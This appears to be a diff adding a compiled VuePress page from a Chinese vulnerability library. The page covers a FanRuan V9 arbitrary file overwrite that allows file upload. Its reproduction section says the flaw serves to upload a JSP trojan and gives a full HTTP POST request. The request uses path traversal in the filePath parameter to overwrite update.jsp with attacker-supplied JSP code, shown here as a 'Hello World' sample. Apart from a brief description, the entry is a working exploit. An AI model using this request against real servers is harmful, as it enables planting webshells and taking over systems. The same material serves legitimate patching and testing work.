@@ -1,0 +1,16 @@
+import{_ as e}from"./plugin-vue_export-helper.21dcd24c.js";import{o as i,c as a,d as n}from"./app.f438cb19.js";const d={},t=n(`<h1 id="oa\u4EA7\u54C1-\u5E06\u8F6F" tabindex="-1"><a class="header-anchor" href="#oa\u4EA7\u54C1-\u5E06\u8F6F" aria-hidden="true">#</a> OA\u4EA7\u54C1-\u5E06\u8F6F</h1><h2 id="\u5E06\u8F6Fv9\u4EFB\u610F\u6587\u4EF6\u8986\u76D6\u5BFC\u81F4\u7684\u6587\u4EF6\u4E0A\u4F20" tabindex="-1"><a class="header-anchor" href="#\u5E06\u8F6Fv9\u4EFB\u610F\u6587\u4EF6\u8986\u76D6\u5BFC\u81F4\u7684\u6587\u4EF6\u4E0A\u4F20" aria-hidden="true">#</a> \u5E06\u8F6FV9\u4EFB\u610F\u6587\u4EF6\u8986\u76D6\u5BFC\u81F4\u7684\u6587\u4EF6\u4E0A\u4F20</h2><h3 id="\u6F0F\u6D1E\u63CF\u8FF0" tabindex="-1"><a class="header-anchor" href="#\u6F0F\u6D1E\u63CF\u8FF0" aria-hidden="true">#</a> \u6F0F\u6D1E\u63CF\u8FF0</h3><p>\u5E06\u8F6F V9 \u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u8986\u76D6\uFF0C\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u4EE5\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20</p><h3 id="\u6F0F\u6D1E\u5F71\u54CD" tabindex="-1"><a class="header-anchor" href="#\u6F0F\u6D1E\u5F71\u54CD" aria-hidden="true">#</a> \u6F0F\u6D1E\u5F71\u54CD</h3><ul><li>\u5E06\u8F6F V9</li></ul><h3 id="\u7F51\u7EDC\u6D4B\u7ED8" tabindex="-1"><a class="header-anchor" href="#\u7F51\u7EDC\u6D4B\u7ED8" aria-hidden="true">#</a> \u7F51\u7EDC\u6D4B\u7ED8</h3><h3 id="\u6F0F\u6D1E\u590D\u73B0" tabindex="-1"><a class="header-anchor" href="#\u6F0F\u6D1E\u590D\u73B0" aria-hidden="true">#</a> \u6F0F\u6D1E\u590D\u73B0</h3><p>\u8FD9\u4E2A\u6F0F\u6D1E\u662F\u4EFB\u610F\u6587\u4EF6\u8986\u76D6\uFF0C\u4E0A\u4F20jsp\u9A6C\uFF0C\u9700\u8981\u627E\u5DF2\u7ECF\u5B58\u5728jsp\u6587\u4EF6\u8FDB\u884C\u8986\u76D6\u3002</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>POST /WebReport/ReportServer?op=svginit&amp;cmd=design_save_svg&amp;filePath=chartmapsvg/../../../../WebReport/update.jsp  HTTP/1.1
+Host: 192.168.10.1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDE
+Connection: close
+Content-Type:text/xml;charset=UTF-8
+
+Content-Length: 74
+
+{&quot;__CONTENT__&quot;:&quot;&lt;%out.println(\\&quot;Hello World!\\&quot;);%&gt;&quot;,&quot;__CHARSET__&quot;:&quot;UTF-8&quot;}
+
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,10),r=[t];function s(l,c){return i(),a("div",null,r)}var u=e(d,[["render",s],["__file","\u5E06\u8F6F.html.vue"]]);export{u as default};
